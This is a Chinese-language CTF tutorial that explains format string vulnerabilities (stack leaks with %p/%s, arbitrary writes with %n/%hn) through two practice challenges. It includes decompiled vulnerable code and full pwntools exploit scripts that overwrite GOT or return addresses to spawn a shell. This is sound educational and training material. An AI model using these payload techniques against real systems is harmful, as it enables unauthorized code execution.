# 通过CTF例题完整学习格式化字符串漏洞

阅读量 **111771**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-13 17:30:46

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01dd7043063c6fa864.jpg)

## 前言：

该漏洞本身已经非常古老了，同时也因为其容易被检测，因此在实际的生产环境中已经不怎么能遇到了，但其原理还是很值得学习的。笔者将在本篇用尽可能便于理解的方式来将该漏洞解释明白。  
如果文章存在纰漏，也欢迎各位师傅纠错。  
 **注：笔者挑选的例题均可在BUUOJ中直接启动远程靶机**

## 引题：

直接讲解其原理或许有些晦涩，不妨先通过一道例题来看看该漏洞造成的问题  
 **例题来源：wdb_2018_2nd_easyfmt**

本题第14行中，printf函数中的参数可由攻击者控制。

    
    
    int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
    {
      char buf[100]; // [esp+8h] [ebp-70h] BYREF
      unsigned int v4; // [esp+6Ch] [ebp-Ch]
    
      v4 = __readgsdword(0x14u);
      setbuf(stdin, 0);
      setbuf(stdout, 0);
      setbuf(stderr, 0);
      puts("Do you know repeater?");
      while ( 1 )
      {
        read(0, buf, 0x64u);
        printf(buf);
        putchar(10);
      }
    }
    

一般来说，printf应该由程序设计者先将打印格式设定好，然后再交由用户提交内容，就像这样：

    
    
    printf("%s",buf)
    

那么，这和例题中的写法的不同在哪呢？

这里涉及到了“变长参数”的知识，但这并不在本文的讨论范围内。

不过，我们能够这样理解：  
“类似于printf这类函数，它们的参数是不定的(或者说参数没有固定个数)。这样一来，内核只能通过“%s“这样的字符格式来按照顺序将参数一一对应”

我们知道，在32位系统中，函数的传参是通过栈Stack实现的，所以机器也不知道栈里的东西究竟是作为参数被Push进来的，还是作为其他变量、返回地址等等被Push进来的。

所以如果我们这样使用printf：

    
    
    printf("%p")
    

显然，我们没有指定%p应该对应的参数；但计算机可不这么认为，它会将当前ESP+4的内容当作参数打印出来。如果这些值是比较特别的数，那么它就已经泄露的重要信息了  
(当然，因为我们能够控制格式化字符串，所以大可用很多很多%p%s%d等标识，强行泄露整个栈的内容)

在了解上述内容之后，我们回到题目，并试着这样输入：

![](https://p4.ssl.qhimg.com/t0107b8a8800c182e1f.png)

于是，我们就这样轻松泄露出栈的地址， **甚至知道了我们的参数会被放在哪里**

观察输出就会发现，有一个指针为”0x41414141“，这显然就是我们输入的”AAAA”

那么我们就会这样想：用某个got表地址替换”AAAA“，然后用”%s“将这个地址读出来

    
    
    printf("%s",buf)
    

这个buf实际上是一个地址，就是上述的”AAAA“，如果我们用got[“puts”]替代”AAAA“，那printf就会从”got[“puts”]“这个地址出取出库函数地址，然后把它当作字符串打印出来

栈结构大致如下：

地址 | 内容  
---|---  
ESP+8 | AAAA  
ESP+12 | BBBB  
地址 | 内容 | 内容指向  
---|---|---  
ESP+8 | got.puts | ->libc.puts  
ESP+12 | BBBB  
  
**%p会将”内容“打印出来，而%s则会将”内容指向“打印出来**  
不过，如果内容是一个非法地址(或没有读的权限)，那%s就会导致段错误而退出

## 漏洞利用：

到目前为止，似乎还只能用来泄露信息，但格式化字符串中还存在一个不怎么常用的”%n“，该占位符不用于输出，而是将
**”当前已打印的字符数写入%n所对应的地址参数中“**

同时，还可以用 **”%?$p“来指示该占位符使用第?个参数**

有了上述两个占位符，我们就能达成”任意地址读写“这一严重的结果

因为我们只需要将”期望写入的地址+填充+%?$n“传入，就能往任何地方写入任意数了

类比例题，如果我们将printf的got表修改为system，再传入”/bin/sh“，就变相执行了

    
    
    system("/bin/sh")
    

回到题目：

![](https://p4.ssl.qhimg.com/t0107b8a8800c182e1f.png)

我们注意到，我们的输入对应着第6个%p，因此能够这样构造payload：

    
    
    puts_got=elf.got["puts"]
    payload=p32(puts_got)+"%6$s"
    

那么在试图找到占位符”%6$s“时，就会将puts_got视作参数，从而能够得到libc的加载地址，计算出system的地址

那么接下来就是复写got表了。网上或许有很多wp是使用pwntools提供的fmtstr_payload完成操作，但笔者建议初学者应该先尝试自行构造payload。过度依赖工具，容易忽略最基本的东西。

## 构造流程：

我们应该确保地址是符合4字节对齐的(64位中为8字节对齐)，这样才能正确地将其视作一个参数

**同时，使用”%hn“或”%hhn“要优于”%n“**

两者分别写入两字节与单字节，而不像”%n“那样写入4字节。

因为”写入“ 意味着
”打印出“。如果我们试图一次性写入四字节，那么就意味着我们需要程序打印出大致0xf7dbb000(笔者用一个libc_base指代该值)个符号(在64位系统中，这个值将拓展到8字节数)，这通常是难以实现的。

本题笔者给出的payload：

    
    
    payload=(p32(printf_got)+"%"+str(padding1)+"c"+"%6$hn")+p32(printf_got+2)+"%"+str(padding2-4)+"c"+"%10$hn"
    

我们使用”%c“并增加合适的字宽(padding)来让程序打印出足够多的字符，并分别写入printf_got的前两个字节和后两个字节

![](https://p1.ssl.qhimg.com/t0193a1dc5bfe429388.png)

我们注意到，这个payload正好能够让地址符合对齐规则

实际的构造过程自然是需要读者自行根据gdb的调试来适当添加空字符，但本文我们只需要理解这个payload的合理性——为什么能够正常覆盖？

  * 0000：0xffe8ca28 对应printf_got #指向低字节
  * 0016：0xffe8ca38 对应printf_got+2 #标识高字节

而在printf中，padding是叠加的，不会因为写入过一次就将”已打印字符数清零“

因此我们往往需要 **从小到大** 来构造写入链，否则先打印了过多字符之后，就没办法写入一个更小的数了(也可以通过溢出来刷新，但这往往非常麻烦)

    
    
    system1=system&0xffff
    system2=(system&0xffff0000)/0x10000
    padding1=system1-4
    padding2=system2-(padding1+4)
    

我们先分别取system的低字节和高字节为system1和system2

padding1作为第一次需要写入的值，由于我们先写入了地址，因此需要减去地址的字符数

padding2则是因为我们先让程序打印了(padding1+4)个字符，因此我们减去这个数作为第二次填充的值(最后再减去第二个地址的字符数，这在payload里有体现)

最后只需要确定参数的位置即可：  
第一个地址对应第六个%p，而第二个地址对应第十个%p(这个我们也可以通过gdb数出来)

    
    
    from pwn import *
    context.log_level = 'debug'
    elf = ELF("./wdb_2018_2nd_easyfmt")
    p = process("./wdb_2018_2nd_easyfmt")
    libc=elf.libc
    #p=remote("node4.buuoj.cn",29237)
    #libc=ELF("libc_32.so.6")
    puts_got=elf.got["puts"]
    printf_got=elf.got["printf"]
    payload=p32(puts_got)+"%6$s"
    p.send(payload)
    puts_addr = u32(p.recvuntil("\xf7")[-4:])
    libc_base=puts_addr-libc.symbols["puts"]
    log.success(hex(libc_base))
    
    system=libc_base+libc.symbols["system"]
    system1=system&0xffff
    system2=(system&0xffff0000)/0x10000
    log.success(hex(system1))
    log.success(hex(system2))
    padding1=system1-4
    padding2=system2-(padding1+4)
    payload=(p32(printf_got)+"%"+str(padding1)+"c"+"%6$hn")+p32(printf_got+2)+"%"+str(padding2-4)+"c"+"%10$hn"
    p.send(payload)
    p.send("/bin/sh\x00")
    p.interactive()
    

## 适用范围：

这个漏洞适用于所有实用”format“，即格式化字符串的函数，常见的有：

函数 | 功能  
---|---  
printf | 输出到 stdout  
fprintf | 输出到指定 FILE 流  
vprintf | 根据参数列表格式化输出到 stdout  
vfprintf | 根据参数列表格式化输出到指定 FILE 流  
sprintf | 输出到字符串  
snprintf | 输出指定字节数到字符串  
vsprintf | 根据参数列表格式化输出到字符串  
vsnprintf | 根据参数列表格式化输出指定字节到字符串  
scanf | 读取stdin到指定内存  
  
## 拓展到堆中：

64位系统中，前6个参数分别对应 rdi, rsi, rdx, rcx, r8, r9，而第七个参数则在ESP+8上，第八个在ESP+0x10，以此类推

因此，我们构造payload，本质上和32位没有区别，无非就是在$?时为其加上6即可

但在堆上时，这往往就变得困难了

格式化字符串不在栈上，这就意味着我们 **无法人为地去布置地址**

上一个例题中，我们通过在栈上布置”目标地址“来写入字节；但当我们往堆中写格式化字符串时，栈里就不会有我们布置的地址了，哪怕通过”%p“泄露了栈中数据，也没办法利用，不是吗?

**例题来源：xman_2019_format**

    
    
    int sub_8048651()
    {
      void *buf; // [esp+Ch] [ebp-Ch]
    
      puts("...");
      buf = malloc(0x100u);
      read(0, buf, 0x37u);
      return sub_804862A(buf);
    }
    
    
    
    char *__cdecl sub_80485C4(char *s)
    {
      char *v1; // eax
      char *result; // eax
    
      puts("...");
      v1 = strtok(s, "|");
      printf(v1);
      while ( 1 )
      {
        result = strtok(0, "|");
        if ( !result )
          break;
        printf(result);
      }
      return result;
    }
    
    
    
    int backdoor() #0x80485AB
    {
      return system("/bin/sh");
    }
    

我们只有一次输入机会，然后程序将以”|“为分隔符分别打印每一条内容

试想一下在这个情况下，格式化字符串漏洞能做到哪些事： **读取栈、写入栈**

唯一不同的就是，无法做到 **”任意地址“** 了

我们期望程序返回到后门函数，那么在不剩其他方法的情况下，就只剩下劫持控制流了

我们在第一次printf处下断点，观察此时的堆栈情况：

![](https://p0.ssl.qhimg.com/t0163aae25a5c37b210.png)

![](https://p5.ssl.qhimg.com/t012183a2f9084663e6.png)

当程序从这个函数返回的时候将通过

    
    
    leave
    ret
    

指令返回，此时的返回地址在0xffffcf8c —> 0x804864b (add esp,0x10)

如果我们修改0x804864b为0x80485AB，就能直接返回到后门函数了

那么我们的目的就变得明确了：  
我们期望能够修改0xffffcf8c的值，就需要让某个地址指向0xffffcf8c构成

    
    
    addr1-->0xffffcf8c --> 0x804864b
    

然后将addr1作为%n的参数，就会像0xffffcf8c中写入期望值了

可以注意到，0xffffcf88，即EBP是一条很长的地址链，我们可以利用该地址链来写

    
    
    EBP=0x8c
    payload="%"+str(EBP)+"c%10$hhn"
    payload+="|"+"%"+str(backdoor)+"c%18$hn"+"|"
    

逻辑：

  1. 第一步：addr1(0xffffcf88)—>addr2(0xffffcfa8)—>addr3(0xffffcfde)
  2. 第二步：addr1(0xffffcf88)—>addr2(0xffffcfa8)—>addr3(0xffffcf8c)
  3. 第三步：addr1(0xffffcfa8)—>addr2(0xffffcf8c)—>addr3(backdoor)

只是由于栈往往是随机化的，因此栈地址自然也会变动。

但是不论如何随机化，栈的初始化都是符合对齐规则的，因此读者可能会发现：0xffffcf8c地址的最后一位0x8c尽管会变化，但不论怎么变都是”0x?c“

因此我们只需要不断的运行，直到某一次程序启动的时候，随机化地址正好是0x8c时即可

    
    
    from pwn import *
    p = process('./xman_2019_format')
    #p=remote("node4.buuoj.cn",29753)
    elf = ELF('./xman_2019_format')
    context.log_level = 'debug'
    backdoor=0x80485AB&0xffff
    EBP=0x8c
    payload="%"+str(EBP)+"c%10$hhn"
    payload+="|"+"%"+str(backdoor)+"c%18$hn"+"|"
    p.send(payload)
    p.interactive()
    

实际上，利用这样的漏洞的条件是苛刻的

  * **1.有多次printf**
  * **2.函数分为多层，能够形成地址链**
  * **3.有后门函数**
  * **4.程序逻辑简单可预测**

之所以有第四点，是因为我们往往难以保证0x8c中的”c“不会因为其他操作而变动

本题是因为程序的逻辑始终相同，因此我们能够预测到栈的使用情况——push多少次、pop多少次，因此最后一位才会始终相同

但如果程序的逻辑稍微复杂一些，我们需要爆破的位数就会一下子上升数十至数百倍，基本就可以放弃了

不过，这样的思路却是合理的。笔者参阅了一些类似的题目，例如CSAW 中的 contacts

contacts要比笔者所说的例题复杂得多，但思路却同样都是劫持控制流，读者若是感兴趣，可以去搜索一下该题

## 思考

之所以说它是苛刻的，是因为在例题中，我们只能利用这一个漏洞

因为没有其他的漏洞，所以我们才不得不用格式化字符串漏洞去覆写，又或是伪造参数

但我们可以想象一下，假设我们能够栈溢出，那么是否就能轻松很多呢？

哪怕是在堆上，如果存在其他的漏洞，那是否还需要用这样的方式拿shell？

实际上，我们大可以用它来泄露canary、fd指针等，而不是以该漏洞作为拿shell的重头戏

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **TokameinE** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/253647](/post/id/253647)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)
  * [格式化字符串漏洞](/tag/格式化字符串漏洞)

 **+1** __5赞

 __收藏

![](https://p1.ssl.qhimg.com/t01d96479fd36259350.png) TokameinE

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

